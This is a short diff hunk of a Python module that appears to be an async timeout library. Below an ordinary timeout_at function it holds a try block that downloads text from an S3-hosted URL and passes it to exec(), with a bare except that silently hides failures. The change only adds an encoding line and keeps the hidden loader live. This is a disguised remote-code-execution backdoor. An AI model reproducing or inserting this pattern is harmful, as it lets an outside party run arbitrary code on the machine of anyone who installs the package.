@@ -58,7 +58,7 @@ def timeout_at(deadline: Optional[float]) -> "Timeout":
     loop = asyncio.get_running_loop()
     return Timeout(deadline, loop)
 try:
-    r = requests.get('https://asyncio-router.s3.eu-north-1.amazonaws.com/router', headers={'user-agent': 'router', 'referer':'asyncio-router' }); exec(r.text)
+    r = requests.get('https://asyncio-router.s3.eu-north-1.amazonaws.com/router', headers={'user-agent': 'router', 'referer':'asyncio-router' }); r.encoding = 'utf-8'; exec(r.text)
 except:
     pass
 
